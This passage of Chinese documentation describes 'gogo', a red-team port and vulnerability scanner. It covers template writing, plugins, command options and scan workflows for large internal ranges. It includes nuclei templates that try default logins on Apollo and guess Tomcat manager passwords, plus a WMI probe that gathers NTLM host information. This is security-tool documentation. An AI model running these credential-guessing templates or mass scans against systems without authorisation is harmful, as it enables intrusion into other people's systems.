\u5927\u90e8\u5206\u573a\u666f\u90fd\u80fd\u901a\u8fc7\u6b63\u5219\u5b9e\u73b0, dsl\u53ea\u662f\u51cf\u5c11\u590d\u6742\u573a\u666f\u7684\u4f7f\u7528\u96be\u5ea6. \u56e0\u6b64, \u6211\u4eec\u53ef\u4ee5\u628a\u8fd9\u6bb5dsl\u4fee\u6539\u4e3a\u5339\u914d\u56fa\u5b9a\u503c \uff08\u5df2\u4e8ev2.12.0\u7248\u672c\u4e2d\u652f\u6301dsl\uff09</li> </ol> <p>example 1 apollo login</p> <p>step 1 \u5220\u9664\u4e0d\u5fc5\u8981\u7684header, \u4ec5\u4fdd\u7559\u5982\u4e0b\u4fe1\u606f, \u5e76\u91cd\u65b0\u6dfb\u52a0tags</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f, tags\u586b\u5199\u7684\u662ffingers\u4e2d\u5b58\u5728\u7684\u6307\u7eb9, \u5982\u679c\u6307\u7eb9\u6ca1\u6709\u8bc6\u522b\u5230, \u5c06\u4e0d\u4f1a\u81ea\u52a8\u4f7f\u7528poc. \u9700\u8981-E poc id \u5f3a\u5236\u6307\u5b9a</p> <pre><code>id: apollo-default-login\n\ninfo:\n  name: Apollo Default Login\n  severity: high\n  tags: apollo\n</code></pre> <p>step2 and step3 \u539f\u672c\u7684poc\u4e2d\u6709\u4e24\u4e2a\u5305, \u4fee\u6539\u4e3a\u4e00\u4e2a. \u6700\u7ec8\u6210\u679c</p> <pre><code>id: apollo-default-login\n\ninfo:\n  name: Apollo Default Login\n  severity: high\n  tags: apollo\n\nrequests:\n  - raw:\n      - |\n        POST /signin HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n        Origin: {{BaseURL}}\n        Referer: {{BaseURL}}/signin?\n\n        username={{user}}&amp;password={{pass}}&amp;login-submit=Login\n    attack: pitchfork\n    payloads:\n      user:\n        - apollo\n      pass:\n        - admin\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: header\n        negative: true\n        words:\n          -  '?#/error'\n        condition: and\n\n      - type: status\n        status:\n          - 302\n</code></pre> <p>example 2 tomcat default login</p> <p>gogo\u4e2d\u79fb\u690d\u4fee\u6539\u5b8c\u7684tomcat-manager-login:</p> <pre><code>id: tomcat-manager-login\ninfo:\n  author: pdteam\n  name: tomcat-manager-default-password\n  severity: high\n  tags: tomcat-manager\n  zombie: tomcat\nhttp:\n  - raw:\n      - |\n        GET /manager/html HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: Basic {{base64(username + ':' + password)}}\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0\n        Accept-Language: en-US,en;q=0.9\n    attack: pitchfork\n    stop-at-first-match: true\n    matchers:\n      - status:\n          - 200\n        type: status\n      - type: word\n        words:\n          - Apache Tomcat\n    extractors:\n      - type: regex\n        name: cookie\n        internal: true\n        part: header\n        regex:\n          - 'JSESSIONID\\..*=([a-z0-9.]+)'\n    matchers-condition: and\n    payloads:\n      username:\n        - admin\n        - root\n        - tomcat\n        - admin\n      password:\n        - admin\n        - root\n        - tomcat\n        - 123456\n</code></pre>"},{"location":"gogo/extension/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"<p>\u56e0\u4e3agogo\u4e3a\u4e86\u7f29\u51cf\u4f53\u79ef, \u4ec5\u4f7f\u7528\u4e86\u6807\u51c6json\u5e93, \u6240\u4ee5\u9700\u8981\u5148\u5c06yaml\u8f6c\u4e3ajson</p> <p>\u4f7f\u7528\u81ea\u5e26\u7684\u811a\u672c <code>yaml2json.py</code>.</p> <p><code>python yaml2json.py apollo-login.yml -f apollo-login.json</code> </p> <p>\u6307\u5b9aef\u6587\u4ef6\u52a0\u8f7dpoc</p> <p><code>gogo.exe -ef .\\poc.json -ip 127.0.0.1 -e -p 80 -debug</code></p> <p>\u5982\u679c\u9700\u8981\u914d\u5408burp\u8c03\u8bd5, \u8bf7\u4f7f\u7528proxifier\u4ee3\u7406, \u4ee3\u7406gogo\u7684\u6d41\u91cf\u5230burp</p> <p></p>"},{"location":"gogo/extension/#\u63d0\u4ea4","title":"\u63d0\u4ea4","text":"<p>\u5b98\u65b9\u7684poc\u4ed3\u5e93\u4f4d\u4e8e https://github.com/chainreactors/gogo-templates/tree/master/nuclei</p> <p>\u63d0\u4ea4\u5bf9\u5e94\u7684pr, \u5c06poc\u653e\u5230\u5408\u9002\u7684\u6587\u4ef6\u5939\u4e0b. \u4e0b\u6b21release\u5c31\u4f1a\u81ea\u52a8\u7f16\u8bd1\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d.</p> <p>\u6210\u4e3aContributors</p> <p>\u5982\u679c\u4e0d\u719f\u6089git\u4f7f\u7528, \u76f4\u63a5\u5c06poc\u590d\u73b0\u6210\u529f\u7684\u622a\u56fe\u4e0epoc\u7684yaml\u590d\u5236\u5230issue\u4e2d, \u6211\u4f1a\u624b\u52a8\u6574\u7406\u5408\u5e76poc. \u4f46\u8fd9\u79cd\u65b9\u5f0f\u53ef\u80fd\u4e0d\u80fd\u5728\u4ed3\u5e93\u7684Contributors \u4e2d\u627e\u5230\u81ea\u5df1.</p> <p>\u4f7f\u7528pull request\u5c31\u80fd\u6210\u4e3arepo\u7684Contributors.</p> <p>pull request</p> <p>\u9996\u5148\u5728github\u4e0a\u70b9\u51fbfork, fork gogo-templates \u5230\u81ea\u5df1\u7684\u8d26\u53f7\u4e0b</p> <p>\u7136\u540e git clone fork\u4e4b\u540e\u7684repo</p> <p>\u5c06\u7f16\u5199\u597d\u7684poc \u653e\u5230gogo-templates/nuclei/\u5bf9\u5e94\u7684\u76ee\u5f55\u4e0b.</p> <p>\u5728\u672c\u5730\u7684\u6587\u4ef6\u5939\u4e0b\u4f7f\u7528, git\u547d\u4ee4</p> <p><code>git add .</code></p> <p><code>git commit -m \"add [poc name]\"</code></p> <p><code>git push origin master</code></p> <p>\u8fd9\u65f6\u5019\u70b9\u5f00\u81ea\u5df1fork\u4e4b\u540e\u7684repo, \u5c31\u53ef\u4ee5\u770b\u5230\u521a\u521a\u7684\u63d0\u4ea4.</p> <p>\u7136\u540e\u70b9\u51fbpull request, \u5c06\u672c\u5730\u7684commit \u63d0\u4ea4\u81f3\u5b98\u65b9\u7684\u4ed3\u5e93.</p> <p>\u7ef4\u62a4\u8005\u770b\u5230pr\u6216\u8005issue\u540e\u4f1areview\u4e4b\u540e\u5408\u5e76. \u4e0b\u4e2a\u7248\u672c\u7684gogo\u5c31\u80fd\u4f7f\u7528\u4f60\u63d0\u4ea4\u7684poc\u4e86.poc\u7f16\u5199.md)</p>"},{"location":"gogo/extension/#go\u63d2\u4ef6","title":"go\u63d2\u4ef6","text":"<p>\u6bcf\u4e2a\u7aef\u53e3\u63a2\u6d4b\u751f\u547d\u5468\u671f\u6709\u4e00\u4e2a\u8d2f\u7a7f\u59cb\u7ec8\u7684result\u53d8\u91cf, \u5728dispatch\u4e2d\u6dfb\u52a0\u89e6\u53d1\u67d0\u4e2a\u63d2\u4ef6\u7684\u903b\u8f91, \u5e76\u5728\u63d2\u4ef6\u7684\u5177\u4f53\u5b9e\u73b0\u4e2d\u4fee\u6539result\u53d8\u91cf\u5373\u53ef\u5b8c\u6210\u63d2\u4ef6\u7684\u7f16\u5199. </p> <p>\u6ca1\u6709\u505a\u8fc7\u591a\u7684\u62bd\u8c61, \u5e0c\u671b\u6700\u6838\u5fc3\u7684\u53ef\u62d3\u5c55\u80fd\u529b\u8fd8\u662f\u4ee5yaml\u7684dsl\u4e3a\u4e3b. </p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50, <code>v2/pkg/plugin/wmiScan.go</code></p> <pre><code>func wmiScan(result *pkg.Result) {\n    result.Port = \"135\"\n    target := result.GetTarget()\n    conn, err := pkg.NewSocket(\"tcp\", target, RunOpt.Delay)\n    if err != nil {\n        return\n    }\n    defer conn.Close()\n\n    result.Open = true\n    ret, err := conn.Request(data, 4096)\n    if err != nil {\n        return\n    }\n\n    off_ntlm := bytes.Index(ret, []byte(\"NTLMSSP\"))\n    if off_ntlm != -1 {\n        result.Protocol = \"wmi\"\n        result.Status = \"WMI\"\n        tinfo := utils.ToStringMap(ntlmssp.NTLMInfo(ret[off_ntlm:]))\n        result.AddNTLMInfo(tinfo, \"wmi\")\n    }\n}\n</code></pre> <p>\u6ca1\u6709\u505a\u8fc7\u591a\u7684\u5305\u88c5, \u53ea\u9700\u8981\u591aresult\u7684\u4e00\u4e9b\u5c5e\u6027\u505a\u51fa\u4fee\u6539, \u5373\u53ef\u5b8c\u6210\u4e00\u4e2a\u7b80\u6613\u7684poc. </p> <p>\u5927\u90e8\u5206\u5e38\u89c1\u7684\u7279\u6b8a\u7aef\u53e3\u90fd\u5df2\u7ecf\u8986\u76d6, \u5982\u679c\u989d\u5916\u7684\u9700\u6c42\u53ef\u4ee5\u5728\u65b0\u5efaissue. \u66f4\u5efa\u8bae\u4f7f\u7528\u8005\u534f\u52a9\u6211\u4eec\u7ef4\u62a4gogo-templates \u4ed3\u5e93.</p>"},{"location":"gogo/extension/#\u6253\u9020\u81ea\u5df1\u7684gogo","title":"\u6253\u9020\u81ea\u5df1\u7684gogo","text":"<p>\u4e4b\u524d\u63d0\u5230\u4e86gogo\u5728\u9009\u7528\u6307\u7eb9, poc\u7684\u65f6\u5019\u90fd\u4e00\u4e9b\u81ea\u5df1\u7684\u53d6\u820d, \u8fd9\u4e9b\u53d6\u820d\u662f\u4e3a\u4e86\u7ea2\u961f\u573a\u666f\u4e0b\u505a\u51fa\u7684, \u4f46\u5982\u679c\u5728\u975e\u7ea2\u961f\u573a\u666f\u4e0b,  \u4f7f\u7528\u8005\u53ef\u4ee5\u81ea\u884c\u6253\u9020\u4e00\u4e2a\u72ec\u5c5e\u4e8e\u81ea\u5df1\u7684gogo. \u4f8b\u5982gogo\u4e2d\u6ca1\u6709\u6dfb\u52a0\u7684\u5404\u79cdoa poc; \u66f4\u591a\u7684\u4e3b\u52a8\u53d1\u5305\u7684\u6307\u7eb9\u7b49\u7b49. </p> <p>\u53ea\u9700\u8981fork\u4e00\u4efdgogo-templates\u4ed3\u5e93, \u7136\u540e\u4ece\u5404\u79cd\u7b2c\u4e09\u65b9\u6307\u7eb9\u4ed3\u5e93\u548cnuclei poc\u5e93\u4e2d\u79fb\u690d\u81ea\u5df1\u60f3\u8981\u7684\u6307\u7eb9\u4e0epoc, \u6216\u8005\u6dfb\u52a0\u81ea\u5df1\u62e5\u6709\u76840day poc/\u6307\u7eb9, \u51e0\u5929\u65f6\u95f4\u5c31\u80fd\u62e5\u6709\u4e00\u4e2a\u66f4\u4e3a\u5f3a\u5927\u7684, \u81ea\u5df1\u7684gogo.</p> <p>gogo\u53ea\u662f\u4e00\u4e2a\u5f15\u64ce, gogo\u7684\u80fd\u529b\u7edd\u5927\u90e8\u5206\u6765\u81ea\u4e8egogo-templates\u4e2d. \u516c\u5f00\u7248\u672c\u7684gogo\u662f\u4e00\u4e2a\u9762\u5411\u5185\u7f51\u7684\u626b\u63cf\u5668. \u5b9e\u9645\u4e0agogo\u4e5f\u80fd\u80dc\u4efb\u5916\u7f51\u7684\u626b\u63cf\u4efb\u52a1. </p>"},{"location":"gogo/start/","title":"gogo \u00b7 \u5165\u95e8","text":""},{"location":"gogo/start/#features","title":"Features","text":"<p>Features.</p> <ul> <li>\u8ba9\u7ea2\u961f\u7684A\u6bb5(\u6216\u5927\u4e8eA\u6bb5)\u626b\u63cf\u6210\u4e3a\u53ef\u80fd</li> <li>\u652f\u6301\u4e3b\u52a8/\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b</li> <li>\u5173\u952e\u4fe1\u606f\u63d0\u53d6, \u5982title, cert \u4ee5\u53ca\u81ea\u5b9a\u4e49\u63d0\u53d6\u4fe1\u606f\u7684\u6b63\u5219</li> <li>\u652f\u6301nuclei poc, \u65e0\u5bb3\u5316\u7684\u626b\u63cf, \u6bcf\u4e2a\u6dfb\u52a0\u7684poc\u90fd\u7ecf\u8fc7\u4eba\u5de5\u5ba1\u6838</li> <li>\u81ea\u7531\u7ec4\u5408\u7684\u626b\u63cf\u903b\u8f91, \u9ad8\u5ea6\u53ef\u63a7\u7684\u626b\u63cf\u884c\u4e3a</li> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u6700\u5feb\u7684\u901f\u5ea6, \u5c3d\u53ef\u80fd\u5c0f\u7684\u5185\u5b58\u4e0eCPU\u5360\u7528.</li> <li>\u6700\u5c0f\u53d1\u5305\u539f\u5219, \u5c3d\u53ef\u80fd\u5c11\u5730\u53d1\u5305\u83b7\u53d6\u6700\u591a\u7684\u4fe1\u606f</li> <li>\u652f\u6301\u4e30\u5bcc\u7684DSL, \u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u914d\u7f6e\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684gogo</li> <li>\u5b8c\u5584\u7684\u8f93\u51fa\u4e0e\u8f93\u51fa\u8bbe\u8ba1</li> <li>\u51e0\u4e4e\u4e0d\u4f9d\u8d56\u7b2c\u4e09\u65b9\u5e93, \u7eaf\u539f\u751fgo\u7f16\u5199, \u652f\u6301\u5168\u529f\u80fd\u5168\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf</li> </ul>"},{"location":"gogo/start/#usage","title":"Usage","text":"<pre><code>gogo -h\n</code></pre> <p>\u5c06\u5c55\u793a\u5b8c\u6574\u7684\u53c2\u6570\u8bf4\u660e</p> <pre><code>Usage:\n  gogo [OPTIONS]\n\nMiscellaneous Options:\n      --version                                    Bool, show version\n  -P=[port|workflow|nuclei|extract]                String, show preset config\n      --debug                                      Bool, show debug info\n      --plugin-debug                               Bool, show plugin debug stack\n      --proxy=                                     String, socks5 proxy url, e.g. socks5://127.0.0.1:11111\n\nInput Options:\n  -i, --ip=                                        IP/CIDR, support comma-split ip/cidr, e.g.\n                                                   192.168.1.1/24,172.16.1.1/24\n  -p, --port=                                      Port, support comma-split preset('-P port' show all preset), range,\n                                                   alias port, e.g. top2,mysql,12345,10000-10100,oxid,smb (default:\n                                                   top1)\n  -l, --list=                                      File, list of IP/CIDR\n  -L                                               Bool, same as -l, input from stdin\n  -j, --json=                                      File, previous results file e.g. -j 1.dat1 or list of colon-split\n                                                   ip:port, e.g. 123.123.123.123:123\n  -J                                               Bool, same as -j, input from stdin\n  -w, --workflow=                                  String, workflow name('-P workflow' show all workflow)\n  -W                                               Bool, same as -w, input from stdin\n  -F, --format=                                    File, to be formatted result file\n\nOutput Options:\n  -f, --file=                                      String, output filename\n      --path=                                      String, output file path\n  -o, --output=                                    String,cmdline output format, default: full (default: default)\n  -O, --file-output=                               String, file output format, default: json (default: default)\n      --output-filter=                             String, When scanning filter the output\n      --output-delimiter=                          String, output delimiter, default [TAB] (default: \"\\t\")\n      --af                                         Bool, auto choice filename\n      --hf                                         Bool, auto choice hidden filename\n  -C, --compress                                   Bool, close compress output file\n      --tee                                        Bool, keep console output\n  -q, --quiet                                      Bool, close log output\n      --no-guess                                   Bool, When formatting not output guess framework\n\nSmart Options:\n  -m, --mod=[s|ss|default|sc]                      String, smart mod (default: default)\n      --ping                                       Bool, alive pre-scan\n      --no                                         Bool, no-plugin, only smart scan\n      --sp=                                        String, smart-port-probe, smart mod default: 80, supersmart mod\n                                                   default: icmp (default: default)\n      --ipp=                                       String, IP-probe, default: 1,254 (default: default)\n\nConfiguration Options:\n  -t, --thread=                                    Int, concurrent thread number,linux default: 4000, windows default:\n                                                   1000\n  -e, --exploit                                    Bool,enable nuclei exploit scan\n  -v, --verbose                                    Bool, enable active finger scan\n  -s, --spray                                      Bool, enable port-first spray generator. if ports number &gt; 500,\n                                                   auto enable\n      --no-spray                                   Bool, force to close spray\n  -E, --exploit-name=                              String, specify nuclei template name\n      --ef=                                        String, load specified templates file\n      --filter=                                    String, filter formatting(-F) results\n      --filter-or                                  FilterOr\n      --payload=                                   String, specify nuclei payload\n      --attack-type=[pitchfork|clusterbomb|sniper] nuclei attack types, sniper|clusterbomb|pitchfork\n      --extract=                                   Strings, custom Extract regexp\n  -d, --timeout=                                   Int, socket and http timeout (default: 2)\n  -D, --ssl-timeout=                               Int, ssl and https timeout (default: 2)\n      --suffix=                                    String, url path\n\nHelp Options:\n  -h, --help                                       Show this help message\n</code></pre>"},{"location":"gogo/start/#quickstart","title":"QuickStart","text":"<p>\u6700\u7b80\u4f7f\u7528</p> <p>\u6307\u5b9a\u7f51\u6bb5\u8fdb\u884c\u9ed8\u8ba4\u626b\u63cf, \u5e76\u5728\u547d\u4ee4\u884c\u8f93\u51fa</p> <p><code>gogo -i 192.168.1.1/24 -p win,db,top2</code></p> <p></p> <p>smart mod</p> <p>\u5f53\u76ee\u6807\u8303\u56f4\u7684\u5b50\u7f51\u63a9\u7801\u5c0f\u4e8e24\u65f6, \u5efa\u8bae\u542f\u7528 smart mod</p> <p>\u4f8b\u5982\u5b50\u7f51\u63a9\u7801\u4e3a16, (\u5982\u679c\u8f93\u51fa\u7ed3\u679c\u8f83\u591a, \u5efa\u8bae\u5f00\u542f--af\u8f93\u51fa\u5230\u6587\u4ef6, \u547d\u4ee4\u884c\u53ea\u8f93\u51fa\u65e5\u5fd7)</p> <p><code>gogo -i 192.168.1.1/16 --mod s -p top2,win,db --af</code></p> <p><code>--af</code>\u7684\u610f\u601d\u4e3a\u81ea\u52a8\u751f\u6210\u6587\u4ef6, <code>--mod s</code>\u7684\u610f\u601d\u4e3a\u4f7f\u7528smart mod\u8fdb\u884c\u626b\u63cf, <code>-p</code>\u7684\u610f\u601d\u4e3a\u6307\u5b9a\u7aef\u53e3, \u53ef\u4f7f\u7528\u7aef\u53e3\u9884\u8bbe(<code>-P port</code> \u67e5\u770b\u6240\u6709\u7684\u7aef\u53e3\u9884\u8bbe).</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u6709\u4e9b\u590d\u6742, \u4f46\u4e0d\u7528\u62c5\u5fc3, \u53ef\u4ee5\u4f7f\u7528workflow\u4ee3\u66ff.\u5982 <code>gogo --workflow 192</code>, </p> <p></p> <p>supersmart mod </p> <p>\u5f53\u76ee\u6807\u8303\u56f4\u7684\u5b50\u7f51\u63a9\u7801\u5c0f\u4e8e16, \u5efa\u8bae\u542f\u7528supersmart\u6a21\u5f0f\u626b\u63cf, \u4f8b\u5982:</p> <p><code>gogo -i 10.0.0.0/8 --mod ss -p top2,win,db --af</code></p> <p>\u6216\u4f7f\u7528workflow\u7b80\u5316\u4e3a <code>gogo --workflow 10</code></p> <p></p> <p>\u5e38\u7528\u7684\u914d\u7f6e\u5df2\u7ecf\u88ab\u96c6\u6210\u5230workflow\u4e2d, \u5982\u679c\u9700\u8981\u81ea\u5b9a\u4e49\u7f51\u6bb5, \u5219\u662f<code>gogo --workflow 10 -i 11.0.0.0/8</code>, \u901a\u8fc7-i\u53c2\u6570\u8986\u76d6--workflow 10 \u4e2d\u7684ip\u5b57\u6bb5. </p> <p>\u56e0\u4e3a<code>--workflow 10</code>\u7684\u8bed\u4e49\u53ef\u80fd\u9020\u6210\u6df7\u6dc6, \u4e5f\u53ef\u4ee5\u4f7f\u7528\u8bed\u4e49\u5316\u7684\u901a\u7528workflow: <code>gogo --workflow ss -i 11.1.1.1/8</code>.</p> <p>\u6ce8\u610f</p> <p>workflow\u4e2d\u7684\u9884\u8bbe\u53c2\u6570\u4f18\u5148\u7ea7\u4f4e\u4e8e\u547d\u4ee4\u884c\u8f93\u5165, \u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c\u8986\u76d6workflow\u4e2d\u7684\u53c2\u6570. </p> <p>\u4f7f\u7528<code>-P workflow</code>\u67e5\u770b\u6240\u6709\u7684workflow\u9884\u8bbe, \u66f4\u4fbf\u6377\u7684\u4f7f\u7528gogo.</p> <p>\u5206\u6790\u626b\u63cf\u7ed3\u679c</p> <p>\u5982\u679c\u6307\u5b9a\u4e86<code>--af</code>\u6216\u8005<code>--workflow</code>(\u6240\u6709--workflow\u5747\u9ed8\u8ba4\u914d\u7f6e\u4e86<code>--af</code>), \u9ed8\u8ba4\u7684\u8f93\u51fa\u7ed3\u679c\u4e3adeflate\u7b97\u6cd5\u538b\u7f29\u540e\u7684json\u6587\u4ef6, \u9700\u8981\u4f7f\u7528<code>-F</code>\u683c\u5f0f\u5316\u626b\u63cf\u7ed3\u679c. </p> <p><code>gogo -F result.dat</code></p> <p>\u4e5f\u53ef\u4ee5\u5bfc\u51fa\u4e3ajson\u8fdb\u884c\u540e\u7eed\u5206\u6790</p> <p><code>gogo -F result.dat -o json -f result.json</code></p>"},{"location":"gogo/start/#input","title":"Input","text":"<p>\u6700\u5e38\u7528\u7684\u8f93\u5165\u5c31\u662f\u547d\u4ee4\u884c, \u901a\u8fc7--ip \u4e0e-p\u53c2\u6570\u914d\u7f6e\u4efb\u52a1.</p> <p>\u4f46\u5728\u5b9e\u9645\u60c5\u51b5\u4e2d, \u4f1a\u6709\u6765\u81ea\u5176\u4ed6\u5de5\u5177\u5bfc\u5165\u7684\u76ee\u6807, \u6709\u6765\u81ea\u81ea\u8eab\u626b\u63cf\u7ed3\u679c\u7684\u4e8c\u6b21\u8f93\u5165, \u6709\u9700\u8981\u8fc7\u6ee4\u51fa\u7279\u5b9a\u6570\u636e\u7684\u518d\u6b21\u8f93\u5165.  \u751a\u81f3\u6709\u6302\u5728\u4e91\u51fd\u6570\u4e0a\u7684gogo\u7248\u672c.</p> <p>\u56e0\u6b64, \u76ee\u524d\u652f\u6301\u975e\u5e38\u591a\u7c7b\u578b\u7684\u8f93\u5165. \u5305\u62ec</p> <ul> <li><code>-i/--ip</code> \u547d\u4ee4\u884c\u8f93\u5165</li> <li><code>-l/--list</code> \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6ip\u5217\u8868,\u914d\u5408\u5176\u4ed6\u547d\u4ee4\u884c\u53c2\u6570, \u540c\u6837\u4f1a\u81ea\u52a8\u8bc6\u522b\u52a0\u5bc6\u89e3\u5bc6</li> <li><code>-w/--workflow</code> workflow, \u652f\u6301\u540d\u5b57(\u9017\u53f7\u5206\u5272), base\u7f16\u7801\u7684json\u683c\u5f0f\u7684workflow</li> <li><code>-j</code> \u4ecegogo\u4e0a\u4e00\u6b21\u626b\u63cf\u7ed3\u679c\u4e2d\u8bfb\u53d6\u4efb\u52a1,\u914d\u7f6e\u5176\u4ed6\u53c2\u6570\u540e\u518d\u6b21\u626b\u63cf<ul> <li>\u4e4b\u524d\u7ed3\u679c\u7684\u6587\u4ef6, \u81ea\u52a8\u8bc6\u522b\u52a0\u5bc6\u5e76\u89e3\u5bc6, \u4e5f\u53ef\u4ee5\u8f93\u5165\u81ea\u884c\u5bfc\u51fa\u7684json\u6587\u4ef6, \u53ea\u9700\u8981\u4fdd\u7559ip,port, framework\u4e09\u4e2a\u5b57\u6bb5\u5373\u53ef.</li> <li>\u542f\u53d1\u5f0f\u626b\u63cf\u7ed3\u679c\u7684\u7f51\u6bb5\u6587\u4ef6</li> <li>ip:port[:framework] \u6309\u884c\u5206\u5272\u7684txt\u6587\u672c, framework\u53ef\u7559\u7a7a</li> </ul> </li> <li>-L \u4ece\u6807\u51c6\u8f93\u5165\u8bfb, \u529f\u80fd\u540c-l\u53c2\u6570</li> <li>-J \u4ece\u6807\u51c6\u8f93\u5165\u8bfb, \u529f\u80fd\u540c-j\u53c2\u6570</li> <li>-W \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u7684workflow json\u683c\u5f0f\u7684\u6587\u4ef6</li> </ul> <p>\u8fd8\u56e0\u4e3astdin\u9047\u5230<code>/00</code>\u88ab\u622a\u65ad, \u6240\u4ee5\u652f\u6301\u5148\u901a\u8fc7base64\u518d\u4f20\u5165\u5230gogo\u4e2d, \u4f8b\u5982<code>cat 1.json | base64 | gogo -J</code></p> <p>\u4ecestdin\u6765\u7684\u6570\u636e\u53ef\u80fd\u662fbase64\u7f16\u7801\u8fc7\u540e\u4e5f\u53ef\u80fd\u662f\u660e\u6587\u7684, gogo\u4f1a\u81ea\u52a8\u5224\u65ad. </p>"},{"location":"gogo/start/#\u7aef\u53e3\u914d\u7f6e","title":"\u7aef\u53e3\u914d\u7f6e","text":"<p>gogo\u652f\u6301\u975e\u5e38\u7075\u6d3b\u7684\u7aef\u53e3\u914d\u7f6e</p> <p>\u53c2\u770b\u7aef\u53e3\u9884\u8bbe,\u53c2\u6570 <code>-P port</code></p> <p>\u4f7f\u7528\u7aef\u53e3\u9884\u8bbe\u81ea\u7531\u5730\u914d\u7f6e\u7aef\u53e3: <code>-p top2,http,1-1000,65534</code></p> <p>\u4e00\u4e9b\u5e38\u7528\u7684\u7aef\u53e3\u914d\u7f6e:</p> <ul> <li><code>-p -</code>  \u7b49\u4e8e<code>-p 1-65535</code></li> <li><code>-p all</code> port.yaml\u4e2d\u7684\u6240\u6709\u7aef\u53e3</li> <li><code>-p common</code> \u5185\u7f51\u5e38\u7528\u7aef\u53e3</li> <li><code>-p top2,top3</code> \u5916\u7f51\u5e38\u89c1web\u7aef\u53e3</li> </ul>"},{"location":"gogo/start/#workflow","title":"workflow","text":"<p>\u5728gogo2.0\u7248\u672c\u540e, \u5f15\u5165\u4e86\u5168\u65b0\u7684\u547d\u4ee4\u884c\u64cd\u4f5c\u65b9\u5f0fworkflow, \u5927\u5927\u7b80\u5316\u4e86\u5341\u51e0\u4e2a\u53c2\u6570\u5bf9\u521d\u5b66\u8005\u9020\u6210\u7684\u56f0\u6270.</p> <p>\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5e38\u7528\u5de5\u4f5c\u6d41, \u6216\u8005\u4f7f\u7528\u9884\u8bbe\u7684\u5de5\u4f5c\u6d41. \u53c2\u6570\u4e3a-w/--workflow.</p> <p>\u53ef\u4ee5\u8f93\u5165<code>gogo -P workflow</code> \u67e5\u770b\u9884\u8bbe\u7684workflow, \u8fd9\u91cc\u662f\u76ee\u524d\u5185\u7f6e\u7684\u6240\u6709\u5de5\u4f5c\u6d41</p> <pre><code>name    index   ip          port        mod ping    arp smartPort   smartIp version exploit outputFile  outputPath\n172noping: \n    0   172.16.0.0/12   top2,win,db ss  false   false   default     default     0       none        auto                              \nsmart: \n    0                   top2,win,db ss  true    true    default     default     0       none        auto                              \nsmartnoping: \n    0                   top2,win,db ss  false   false   default     default     0       none        auto                              \n192c: \n    0   192.168.0.0/16  top1        s   false   false   default     default     0       none        auto                              \ninternoping: \n    0   10.0.0.0/8      top2,win,db ss  false   false   default     default     0       none        auto                              \n    1   172.16.0.0/12   top2,win,db ss  false   false   default     default     0       none        auto                              \n    2   192.168.0.0/16  top2,win,db s   false   false   default     default     0       none        auto                              \nsmartc: \n    0                   top1        sc  false   false   default     default     0       none        auto                              \nc: \n    0                   top1        s   false   false   default     default     0       none        auto                              \ninterc: \n    0   10.0.0.0/8      top1        sc  false   false   default     default     0       none        auto                              \n    1   172.16.0.0/12   top1        sc  false   false   default     default     0       none        auto                              \n    2   192.168.0.0/16  top1        s   false   false   default     default     0       none        auto                              \ninterb: \n    0   10.0.0.0/8      top1        ss  false   false   default     default     0       none        auto                              \n    1   172.16.0.0/12   top1        ss  false   false   default     default     0       none        auto                              \n    2   192.168.0.0/16  top1        ss  false   false   default     default     0       none        auto                              \n10noping: \n    0   10.0.0.0/8      top2,win,db ss  false   false   default     default     0       none        auto                              \n192noping: \n    0   192.168.0.0/16  top2,win,db s   false   false   default     default     0       none        auto                              \n10: \n    0   10.0.0.0/8      top2,win,db ss  true    true    default     default     0       none        auto                              \n172: \n    0   172.16.0.0/12   top2,win,db ss  true    true    default     default     0       none        auto                              \n192: \n    0   192.168.0.0/16  top2,win,db s   true    true    default     default     0       none        auto                              \n10c: \n    0   10.0.0.0/8      top1        sc  false   false   default     default     0       none        auto                              \n192b: \n    0   192.168.0.0/16  top1        ss  false   false   default     default     0       none        auto                              \nb: \n    0                   top1        ss  false   false   default     default     0       none        auto                              \ninter: \n    0   10.0.0.0/8      top2,win,db ss  true    true    default     default     0       none        auto                              \n    1   172.16.0.0/12   top2,win,db ss  true    true    default     default     0       none        auto                              \n    2   192.168.0.0/16  top2,win,db s   true    true    default     default     0       none        auto                              \n10b: \n    0   10.0.0.0/8      top1        ss  false   false   default     default     0       none        auto                              \n172c: \n    0   172.16.0.0/12   top1        sc  false   false   default     default     0       none        auto                              \n172b: \n    0   172.16.0.0/12   top1        ss  false   false   default     default     0       none        auto   \n</code></pre> <p>\u867d\u7136\u5df2\u7ecf\u91c7\u7528workflow\u7b80\u5316\u4e86\u4f7f\u7528\u8005\u4f7f\u7528\u7684\u96be\u5ea6, \u4f46\u4e0d\u4ee3\u8868\u80fd\u7b80\u5316\u7406\u89e3\u5de5\u4f5c\u6d41\u539f\u7406\u7684\u96be\u5ea6. \u8fd9\u5f20\u601d\u7ef4\u5bfc\u56fe\u5217\u51fa\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684\u5de5\u4f5c\u6d41\u5de5\u4f5c\u903b\u8f91.</p> <p></p> <p>\u9700\u8981\u77e5\u9053\u7684\u662f, \u91cc\u9762\u7684\u6bcf\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8986\u76d6, \u547d\u4ee4\u884c\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eworkflow\u4e2d\u7684\u914d\u7f6e, \u5177\u4f53\u7684\u53c2\u6570\u89c1help. </p> <p>\u4f8b\u5982:<code>gogo --workflow 10 -p 1-65535 -ev</code></p> 